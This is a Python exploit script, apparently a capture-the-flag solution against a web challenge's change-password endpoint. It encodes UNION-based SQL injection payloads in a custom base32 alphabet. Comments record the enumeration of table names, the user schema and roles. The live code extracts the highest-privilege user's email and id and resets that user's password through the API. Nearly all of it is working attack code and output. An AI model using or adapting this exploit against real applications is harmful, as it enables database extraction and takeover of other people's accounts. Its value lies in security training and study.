import requests
import re

alphabet = "Abcd3fgh1jkImn0pqrs7uvwxyz985462"

BASE_URL = "https://crackford-77a13da233274cba.deploy.phreaks.fr/"


def to_custom_base32(input):
    to_bin = ""
    for i in input:
        to_bin += format(ord(i), "#010b")[2:]
    out = ""
    for chunk in [to_bin[i : i + 5] for i in range(0, len(to_bin), 5)]:
        index = int(chunk, 2)
        out += alphabet[index]
    return out


def send_payload(payload):
    r = requests.get(f"{BASE_URL}/change-password?h={to_custom_base32(payload)}")
    if r.status_code == 200:
        m = re.search(r"password for(.*?)<input", r.text, re.DOTALL)
        return m.group(1).strip()
    else:
        return f"Error {r.status_code}"


def send_sqli(payload):
    return send_payload(f"fake@mail.fr|{payload}|PADDING")


def change_password(mail, id, new_password):
    r = requests.post(
        f"{BASE_URL}/api/change-password?h={to_custom_base32(f'{mail}|{id}|PADDING')}",
        json={"password": new_password},
    )
    if r.status_code == 200:
        return True
    else:
        return f"Error {r.status_code}"


# print(send_sqli("111111' union select group_concat(tbl_name) FROM sqlite_master WHERE type='table' --"))
# user

# print(send_sqli("111111' union select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user' --"))
# CREATE TABLE user (
#         id INTEGER NOT NULL,
#         username VARCHAR(100) NOT NULL,
#         mail VARCHAR(100) NOT NULL,
#         password VARCHAR NOT NULL,
#         role VARCHAR NOT NULL,
#         PRIMARY KEY (id),
#         UNIQUE (mail)
# )

# print(send_sqli("111111' union select role FROM user --"))
# guest

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest'--"))
# support

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest' AND role != 'support'--"))
# top_super_user

email = send_sqli("a' union select mail from user where role='top_super_user'--")
id = send_sqli("a' union select id from user where role='top_super_user'--")
password = "password"

if change_password(email, id, password) is True:
    print(f"Password for {email} (id={id}) has been changed to '{password}'")
else:
    print("Exploit error")
